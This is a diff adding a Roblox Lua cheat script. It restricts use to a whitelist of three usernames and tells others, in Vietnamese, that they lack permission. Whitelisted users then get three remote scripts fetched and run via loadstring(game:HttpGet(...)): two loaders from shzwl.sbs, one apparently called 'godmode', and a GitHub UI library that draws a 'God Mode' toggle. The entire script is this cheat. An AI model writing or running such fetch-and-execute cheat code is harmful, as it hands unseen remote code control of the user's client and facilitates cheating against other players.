@@ -1,0 +1,28 @@
+local allowedUsers = {
+    ["emfankia123"] = true,
+    ["seven09812"] = true,
+    ["foxgoodboy123]"] = true
+}
+local currentUserName = game.Players.LocalPlayer.Name
+
+if not allowedUsers[currentUserName] then
+    game.StarterGui:SetCore("SendNotification", {
+        Title = "?";
+        Text = "Bạn không có quyền sử dụng script này.";
+        Duration = 5;
+    })
+    return
+end
+    loadstring(game:HttpGet("https://shzwl.sbs/loaders/discordx2swnz.lua"))()
+    wait()
+    loadstring(game:HttpGet("https://shzwl.sbs/loaders/godmode.lua"))()
+    local library = loadstring(game.HttpGet(game, "https://raw.githubusercontent.com/VNT-UNIVERSAL/MyCode/main/UILib"))()
+    local w1 = library:Window("Bat Tu")
+    w1:Toggle(
+        "Inf Health",
+        "God Mode",
+        false,
+        function(toggled)
+            _G.xsnwz = toggled
+        end
+    )
